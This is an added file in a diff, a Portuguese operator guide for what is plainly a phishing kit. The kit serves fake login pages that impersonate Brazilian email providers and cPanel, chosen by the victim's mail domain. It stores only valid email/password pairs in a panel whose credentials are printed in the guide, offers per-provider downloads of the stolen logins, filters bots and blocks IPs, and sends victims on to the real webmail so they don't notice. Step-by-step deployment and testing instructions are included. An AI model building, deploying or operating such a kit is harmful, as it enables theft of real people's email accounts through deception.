@@ -1,0 +1,150 @@
+# COMO TESTAR CADA TELA — Security Webmail
+# ==========================================
+# Para quem NAO sabe programacao. So copiar e colar no navegador.
+#
+# REGRA SIMPLES:
+#   Pegue o link abaixo, troque o email de exemplo pelo email real,
+#   cole na barra de endereco do Chrome/Edge e aperte Enter.
+#
+# FORMATO DO LINK:
+#   https://security-webmail.fly.dev/?=SEUEMAIL@dominio.com.br
+#
+#   O "?=" antes do email e OBRIGATORIO.
+#   Exemplo: https://security-webmail.fly.dev/?=joao@bol.com.br
+#
+# O sistema le o MX do dominio e abre a tela certa sozinho.
+# Se nao reconhecer o provedor, abre a tela cPanel (padrao).
+#
+# =============================================================================
+# PAINEL UNICO — VER LOGINS SALVOS
+# =============================================================================
+#
+#   Link:  https://security-webmail.fly.dev/painel/
+#
+#   Usuario:  Danadinho
+#   Senha:    Danado2027
+#
+#   No painel voce pode:
+#   - Ver contadores de cada tela (BOL, UOL, Terra, etc.)
+#   - Clicar "Abrir console de logins" para ver emails salvos
+#   - Baixar TODOS os logins de uma vez (botao Baixar logins)
+#   - Baixar SOMENTE um provedor (ex: "Baixar BOL", "Baixar Terra PF")
+#   - Bloquear / liberar IPs
+#   - Ver bots bloqueados pelo anti-bot
+#
+#   IMPORTANTE: So salva email+senha quando o login for 100% VALIDO.
+#   Senha errada NAO aparece no painel nem no txt.
+#
+# =============================================================================
+# TESTAR CADA PROVEDOR — LINK PRONTO PARA COPIAR
+# =============================================================================
+#
+# --- 1. BOL ---
+#   Email exemplo:  alguem@bol.com.br
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=alguem@bol.com.br
+#
+# --- 2. UOL (pessoa fisica) ---
+#   Email exemplo:  alguem@uol.com.br
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=alguem@uol.com.br
+#
+# --- 3. UOL Pro (empresas / uhserver) ---
+#   Email exemplo:  contato@seudominio.com.br  (dominio com MX uhserver)
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=contato@seudominio.com.br
+#
+# --- 4. Terra (pessoa fisica) ---
+#   Email exemplo:  sapataria.do.futuro@terra.com.br
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=sapataria.do.futuro@terra.com.br
+#
+# --- 5. Terra Empresas (PJ) ---
+#   Email exemplo:  empresa@terraempresas.com.br
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=empresa@terraempresas.com.br
+#
+# --- 6. KingHost ---
+#   Email exemplo:  email@seudominio.com.br  (dominio hospedado KingHost)
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=email@seudominio.com.br
+#
+# --- 7. Hostinger ---
+#   Email exemplo:  email@seudominio.com.br  (dominio com MX hostinger)
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=email@seudominio.com.br
+#
+# --- 8. HostGator ---
+#   Email exemplo:  email@seudominio.com.br  (dominio com MX hostgator)
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=email@seudominio.com.br
+#
+# --- 9. Locaweb ---
+#   Email exemplo:  email@seudominio.com.br  (dominio com MX locaweb)
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=email@seudominio.com.br
+#
+# --- 10. cPanel / Webmail padrao (fallback) ---
+#   Quando o dominio NAO e BOL, UOL, Terra, etc. — abre tela cPanel.
+#   Email exemplo:  alguem@gmail.com
+#   Link para testar:
+#   https://security-webmail.fly.dev/?=alguem@gmail.com
+#
+# =============================================================================
+# FORCAR UMA TELA ESPECIFICA (sem depender do MX)
+# =============================================================================
+#
+#   Troque NOME-DA-TELA por: bol, uol-fisico, uol-pro, terra-fisico,
+#   terra-juridico, kinghost, hostinger, hostgator, locaweb, cpanel-webmail
+#
+#   https://security-webmail.fly.dev/p/NOME-DA-TELA/
+#
+#   Exemplos:
+#   https://security-webmail.fly.dev/p/bol/
+#   https://security-webmail.fly.dev/p/terra-fisico/
+#   https://security-webmail.fly.dev/p/locaweb/
+#
+# =============================================================================
+# PASSO A PASSO PARA TESTAR (qualquer tela)
+# =============================================================================
+#
+#   1. Copie um link de cima (com email de exemplo ou troque pelo real)
+#   2. Cole no navegador e aperte Enter
+#   3. Deve abrir a tela de login do provedor certo
+#   4. Digite email e senha reais e clique Entrar
+#   5. Se a senha for VALIDA: redireciona para o webmail real
+#   6. Abra o painel: https://security-webmail.fly.dev/painel/
+#   7. Login: Danadinho / Danado2027
+#   8. Veja se o login apareceu no console ou baixe o txt
+#
+# =============================================================================
+# TROCAR SENHA DO PAINEL (depois do deploy)
+# =============================================================================
+#
+#   Abra PowerShell e digite:
+#   fly secrets set PANEL_PASS=SuaNovaSenhaForte -a security-webmail
+#
+#   Usuario padrao: Danadinho (troque com PANEL_USER=OutroNome)
+#
+# =============================================================================
+# SUBIR / ATUALIZAR A MAQUINA VOCE MESMO
+# =============================================================================
+#
+#   Opcao facil:
+#   Clique duas vezes em: recuperado\deploy\SUBIR-SECURITY-WEBMAIL.bat
+#
+#   Opcao manual (PowerShell na pasta Telas):
+#   cd C:\Users\servidor\Desktop\Telas
+#   fly auth login
+#   fly deploy -a security-webmail
+#
+#   Leia tambem: recuperado\deploy\LEIA-ME-DEPLOY.txt
+#
+# =============================================================================
+# LINKS UTEIS
+# =============================================================================
+#
+#   Site:     https://security-webmail.fly.dev/
+#   Painel:   https://security-webmail.fly.dev/painel/
+#   Fly.io:   https://fly.io/apps/security-webmail
+#   Saude:    https://security-webmail.fly.dev/health.php
